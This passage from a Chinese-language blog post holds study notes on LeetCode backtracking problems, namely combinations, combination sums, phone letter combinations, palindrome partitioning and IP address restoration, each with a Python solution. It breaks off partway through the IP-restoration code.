      <link href="/2024/03/01/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/01/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>用于记录刷leetcode学习各种算法的各种总结以及感想记录</p><p><a href="https://www.programmercarl.com/">比较好的leetcode刷题计划，刷完代码水平会有一个很明显的提升</a></p><ul><li><p>回溯算法</p></li><li><p>动态规划</p></li><li><p>贪心算法</p></li><li><p>二叉树</p></li><li><p>图论</p></li></ul><h1 id="回溯算法"><a class="markdownIt-Anchor" href="#回溯算法"></a> 回溯算法</h1><p>回溯法也可以叫做回溯搜索法，它是一种搜索的方式。</p><p>回溯是递归的副产品，只要有递归就会有回溯</p><p><strong>回溯的本质是穷举，穷举所有可能，然后选出我们想要的答案</strong>，如果想让回溯法高效一些，可以加一些剪枝的操作，但也改不了回溯法就是穷举的本质。</p><p>那么既然回溯法并不高效为什么还要用它呢？</p><p>一些问题能暴力搜出来就不错了，撑死了再剪枝一下，还没有更高效的解法。</p><p>回溯法，一般可以解决如下几种问题：</p><ul><li>组合问题：N个数里面按一定规则找出k个数的集合</li><li>切割问题：一个字符串按一定规则有几种切割方式</li><li>子集问题：一个N个数的集合里有多少符合条件的子集</li><li>排列问题：N个数按一定规则全排列，有几种排列方式</li><li>棋盘问题：N皇后，解数独等等</li></ul><p><strong>回溯法解决的问题都可以抽象为树形结构</strong></p><p>溯法解决的都是在集合中递归查找子集，<strong>集合的大小就构成了树的宽度，递归的深度，都构成的树的深度</strong>。</p><p>递归就要有终止条件，所以必然是一棵高度有限的树（N叉树）。</p><p><strong>一句话总结这道题的模板就是，for循环横向遍历，递归纵向遍历</strong></p><h2 id="组合问题"><a class="markdownIt-Anchor" href="#组合问题"></a> 组合问题</h2><h3 id="77-组合"><a class="markdownIt-Anchor" href="#77-组合"></a> <a href="https://leetcode.cn/problems/combinations/">77. 组合</a></h3><p>给定两个整数 <code>n</code> 和 <code>k</code>，返回范围 <code>[1, n]</code> 中所有可能的 <code>k</code> 个数的组合。</p><p>你可以按 <strong>任何顺序</strong> 返回答案。</p><h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4><p>直接的解法当然是使用for循环</p><p>但是如果<strong>n为100，k为50呢，那就50层for循环</strong></p><p><strong>现虽然想暴力搜索，但是用for循环嵌套连暴力都写不出来</strong></p><p>所以回溯搜索就成为我们的选择，虽然也是暴力，但是至少可以写出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combine</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#存放结果集</span>        self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">backtracking</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span>startIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> k<span class="token punctuation">:</span>             result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startIndex<span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#剪枝优化 终点应该为n-(k-len(path))+1+1</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#处理节点</span>            self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回溯，撤销处理的节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="剪枝优化"><a class="markdownIt-Anchor" href="#剪枝优化"></a> 剪枝优化</h4><p>回溯法虽然是暴力搜索，但也有时候可以有点剪枝优化一下的</p><p><strong>如果for循环选择的起始位置之后的元素个数 已经不足 我们需要的元素个数了，那么就没有必要搜索了</strong></p><p>优化过程如下：</p><ol><li>已经选择的元素个数：path.size();</li><li>所需需要的元素个数为: k - path.size();</li><li>列表中剩余元素（n-i） &gt;= 所需需要的元素个数（k - path.size()）</li><li>在集合n中至多要从该起始位置 : i &lt;= n - (k - path.size()) + 1，开始遍历</li></ol><p>因此只需要在for循环的终止节点修改如上即可实现</p><h3 id="216-组合总和-iii"><a class="markdownIt-Anchor" href="#216-组合总和-iii"></a> <a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></h3><p>找出所有相加之和为 <code>n</code> 的 <code>k</code> 个数的组合，且满足下列条件：</p><ul><li>只使用数字1到9</li><li>每个数字 <strong>最多使用一次</strong></li></ul><h4 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2"></a> 思路</h4><p>思路跟上题差不多，也可抽象为n叉树，然后dfs</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum3</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">backtracking</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>sindex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">></span> n<span class="token punctuation">:</span> <span class="token comment">#优化1:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> k <span class="token keyword">and</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">==</span>n<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sindex<span class="token punctuation">,</span><span class="token number">9</span><span class="token operator">-</span><span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#优化2</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回溯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="17-电话号码的字母组合"><a class="markdownIt-Anchor" href="#17-电话号码的字母组合"></a> <a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></h3><p>给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。</p><h4 id="思路-3"><a class="markdownIt-Anchor" href="#思路-3"></a> 思路</h4><p>首先把该问题抽象为一个树:假如给出数字234</p><p>index0:  a  b c</p><p>index1:def  def  def</p><p>index2:ghighighi ghighighi    ghighighi</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>letterMap<span class="token operator">=</span><span class="token punctuation">[</span>            <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment">#0</span>            <span class="token string">''</span><span class="token punctuation">,</span><span class="token comment">#1</span>            <span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token comment">#2</span>            <span class="token string">'def'</span><span class="token punctuation">,</span><span class="token comment">#3</span>            <span class="token string">'ghi'</span><span class="token punctuation">,</span><span class="token comment">#4</span>            <span class="token string">'jkl'</span><span class="token punctuation">,</span><span class="token comment">#5</span>            <span class="token string">'mno'</span><span class="token punctuation">,</span><span class="token comment">#6</span>            <span class="token string">'pqrs'</span><span class="token punctuation">,</span><span class="token comment">#7</span>            <span class="token string">'tuv'</span><span class="token punctuation">,</span><span class="token comment">#8</span>            <span class="token string">'wxyz'</span><span class="token comment">#9</span>        <span class="token punctuation">]</span>        self<span class="token punctuation">.</span>result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>s<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>digits<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>s<span class="token punctuation">)</span>            <span class="token keyword">return</span>        digit<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>digits<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        letters<span class="token operator">=</span>self<span class="token punctuation">.</span>letterMap<span class="token punctuation">[</span>digit<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>letters<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>s<span class="token operator">+=</span>letters<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token comment">#存储这一层的值，并进入下一层树</span>            self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>digits<span class="token punctuation">,</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>s<span class="token operator">=</span>self<span class="token punctuation">.</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#回溯到上一步</span>    <span class="token keyword">def</span> <span class="token function">letterCombinations</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> digits<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>result        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>digits<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="39-组合总和"><a class="markdownIt-Anchor" href="#39-组合总和"></a> <a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h3><p>给你一个 <strong>无重复元素</strong> 的整数数组 <code>candidates</code> 和一个目标整数 <code>target</code> ，找出 <code>candidates</code> 中可以使数字和为目标数 <code>target</code> 的 所有 <strong>不同组合</strong> ，并以列表形式返回。你可以按 <strong>任意顺序</strong> 返回这些组合。</p><p><code>candidates</code> 中的 <strong>同一个</strong> 数字可以 <strong>无限制重复被选取</strong> 。如果至少一个数字的被选数量不同，则两种组合是不同的。</p><p>对于给定的输入，保证和为 <code>target</code> 的不同组合数少于 <code>150</code> 个。</p><h4 id="思路-4"><a class="markdownIt-Anchor" href="#思路-4"></a> 思路</h4><ul><li><p>本题和<a href="https://programmercarl.com/0077.%E7%BB%84%E5%90%88.html">77.组合 (opens new window)</a>，<a href="https://programmercarl.com/0216.%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CIII.html">216.组合总和III (opens new window)</a>的区别是：本题没有数量要求，可以无限重复，但是有总和的限制，所以间接的也是有个数的限制。</p></li><li><p>本题搜索的过程抽象成树形结构：</p><p>17629</p></li></ul><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> candidates<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>sIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> total <span class="token operator">></span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> total <span class="token operator">==</span> target<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sIndex<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            total<span class="token operator">+=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>i<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token comment">#可以重复选取，sindex取i</span>            total<span class="token operator">-=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment">#进行回溯操作</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="40-组合总和-ii"><a class="markdownIt-Anchor" href="#40-组合总和-ii"></a> <a href="https://leetcode.cn/problems/combination-sum-ii/">40. 组合总和 II</a></h3><p>给定一个候选人编号的集合 <code>candidates</code> 和一个目标数 <code>target</code> ，找出 <code>candidates</code> 中所有可以使数字和为 <code>target</code> 的组合。</p><p><code>candidates</code> 中的每个数字在每个组合中只能使用 <strong>一次</strong> 。</p><p>**注意：**解集不能包含重复的组合。</p><h4 id="思路-5"><a class="markdownIt-Anchor" href="#思路-5"></a> 思路</h4><p>其实就是上题的改编版，区别在于元素不能重复,但是想了好久还是不明白怎么进行树层的去重</p><p><a href="https://leetcode.cn/problems/combination-sum-ii/solutions/14753/hui-su-suan-fa-jian-zhi-python-dai-ma-java-dai-m-3/">组合总和II解析</a></p><p>实际上可以类比三数之和，先排序，利用双指针，遇到与前一项相等的数值就直接退出进行下一次遍历</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> candidates<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">0</span> <span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        candidates<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dfs2<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">dfs2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>sIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> total <span class="token operator">></span> target<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> total <span class="token operator">==</span> target<span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>sIndex<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>candidates<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">></span> sIndex <span class="token keyword">and</span> candidates<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#</span>                <span class="token keyword">continue</span>            total<span class="token operator">+=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>dfs2<span class="token punctuation">(</span>candidates<span class="token punctuation">,</span>target<span class="token punctuation">,</span>total<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token comment">#不可以重复选取，sindex取i+1</span>            total<span class="token operator">-=</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment">#进行回溯操作</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分割问题"><a class="markdownIt-Anchor" href="#分割问题"></a> 分割问题</h2><h3 id="131-分割回文串"><a class="markdownIt-Anchor" href="#131-分割回文串"></a> <a href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a></h3><p>给你一个字符串 <code>s</code>，请你将 <code>s</code> 分割成一些子串，使每个子串都是 <strong>回文串</strong> 。返回 <code>s</code> 所有可能的分割方案。</p><p><strong>回文串</strong> 是正着读和反着读都一样的字符串。</p><h4 id="思路-6"><a class="markdownIt-Anchor" href="#思路-6"></a> 思路</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">partition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>start<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span>n<span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">if</span> i<span class="token operator">&lt;</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>            temp<span class="token operator">=</span>s<span class="token punctuation">[</span>start<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> temp<span class="token operator">==</span>temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment">#判断回文</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#遍历下一个字符串</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#回溯</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="93-复原-ip-地址"><a class="markdownIt-Anchor" href="#93-复原-ip-地址"></a> <a href="https://leetcode.cn/problems/restore-ip-addresses/">93. 复原 IP 地址</a></h3><p><strong>有效 IP 地址</strong> 正好由四个整数（每个整数位于 <code>0</code> 到 <code>255</code> 之间组成，且不能含有前导 <code>0</code>），整数之间用 <code>'.'</code> 分隔。</p><ul><li>例如：<code>&quot;0.1.2.201&quot;</code> 和<code> &quot;192.168.1.1&quot;</code> 是 <strong>有效</strong> IP 地址，但是 <code>&quot;0.011.255.245&quot;</code>、<code>&quot;192.168.1.312&quot;</code> 和 <code>&quot;192.168@1.1&quot;</code> 是 <strong>无效</strong> IP 地址。</li></ul><p>给定一个只包含数字的字符串 <code>s</code> ，用以表示一个 IP 地址，返回所有可能的<strong>有效 IP 地址</strong>，这些地址可以通过在 <code>s</code> 中插入 <code>'.'</code> 来形成。你 <strong>不能</strong> 重新排序或删除 <code>s</code> 中的任何数字。你可以按 <strong>任何</strong> 顺序返回答案。</p><h4 id="思路-7"><a class="markdownIt-Anchor" href="#思路-7"></a> 思路</h4><p>实际上相当于给字符串中加上四个逗号</p><p>写回溯算法的关键还是要思路清晰，逻辑正确那么结果就一定正确</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">restoreIpAddresses</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token comment">#假设插入4个逗号</span>        <span class="token comment">#index代表开始插入的下标</span>        <span class="token comment">#dots代表已经插入的逗号数</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">12</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">backTrack</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>dots<span class="token punctuation">,</span>curIP<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dots <span class="token operator">==</span><span class="token number">4</span> <span class="token keyword">and</span> index <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>curIP<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">if</span> dots <span class="token operator">></span><span class="token number">4</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">min</span><span class="token punctuation">(</span>index<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span 